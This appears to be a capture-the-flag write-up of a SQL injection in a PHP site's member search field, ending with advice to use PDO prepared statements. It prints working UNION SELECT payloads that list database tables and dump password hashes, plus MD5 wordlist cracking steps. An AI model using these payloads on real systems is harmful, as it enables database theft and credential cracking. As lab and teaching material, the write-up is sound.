# SQL injection on the member search field in the members page

## Description
We identified a security vulnerability in the input field located at `http://IP/index.php?page=member`.

Entering certain input, such as `union` triggers a SQL error that indicates SQL expressions are treated as intended rather than being escaped or treated as regular strings. This vulnerability allows us to exploit the system and extract data from the database by sending requests through the input field.<br />
<br />
Since the input field expects an ID number, the corresponding SQL query should resemble:
```
SELECT first_name, last_name FROM users WHERE users.user_id = ${input_value}
```
This query prints the first name and last name of the member with the given member ID. Since we don't need the website to display data about any specific member, we can choose the ID `-1`, which is unlikely to match any existing ID.<br />
<br />
To append our request after the original query, we can use the `UNION` operator, which combines the result sets of two or more `SELECT` statements:
```
SELECT first_name, last_name FROM users WHERE users.user_id = -1 UNION SELECT XXX FROM XXX
```
This allows us to execute our exploit immediately after the original request.<br />
<br />
We aim to retrieve data from the `information_schema`. In SQL, `information_schema` is a schema providing metadata about database objects. We are particularly interested in the `table_name` and `column_name` columns from `information_schema.columns` to understand the general structure of the database.<br />
<br />
With this in mind, we have:<br />
<br />
INPUT:
```
-1 UNION SELECT table_name, column_name FROM information_schema.columns
```

OUTPUT:
```
ID: -1 UNION select table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign
```

The result reveals a `users` table and two interesting columns: `Commentaire` and `countersign`. Subsequently, we will send the following request to retrieve these two fields from all users in the database:<br />
<br />
INPUT:
```
-1 UNION SELECT commentaire, countersign FROM users
```

OUTPUT:
```
ID: -1 union select commentaire, countersign from users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Since the password appears to be a hash, we need to determine the hash type before obtaining the original string. For this, we will use the hash-identifier tool on Kali Linux:
```
user@kali:~$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 5ff9d0165b4f92b14994e5c685cdce28

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Now, it has been determined that the password is likely hashed with `MD5`. We will proceed to generate a word list in `wordlist.txt` and create a script named `md5comparer.sh`. The script will hash each word from the word list using MD5 and compare the generated hashes with the password until a match is found:
```
user@kali:~$ bash md5comparer.sh wordlist.txt 5ff9d0165b4f92b14994e5c685cdce28
no match found for: 'quarantedeux'
no match found for: 'quarante-deux'
no match found for: 'quarante_deux'
no match found for: 'Quarante-Deux'
no match found for: 'QuaranteDeux'
no match found for: '42'
no match found for: 'fortytwo'
no match found for: 'forty-two'
no match found for: 'forty_two'
no match found for: 'Forty-Two'
HASHES MATCH FOR: 'FortyTwo'
Found match, exiting...
```
Here, a match is found for `FortyTwo`. Let's recall the discovered instruction:
```
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

We will, therefore, convert all the characters to lowercase: `FortyTwo -> fortytwo`

...and hash it with SHA-256:
```
user@kali:~$ echo -n "fortytwo" | sha256sum
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
```
Thus, the flag is `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`.

## Security measures
Inspecting the HTML code, this line:
```
<a href="index.php">Home</a>
```
reveals that the website is coded in `PHP`.<br />
To avoid SQL injection in PHP, it is recommended to use `prepared statements` with `parameterized queries`. Below are examples demonstrating how to use prepared statements in PHP with MySQL using the `PDO extension`:

```
// Connect to database
$conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Example with positional parameters
$userInput = "John";
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$userInput]);
   
// Example with named parameters
$userInput = "John";
$stmt = $conn->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $userInput]);
```
In both examples, the user input is properly bound to the SQL query using placeholders (`?` for positional parameters or `:username` for named parameters). This way, the input is treated as data, preventing SQL injection attacks.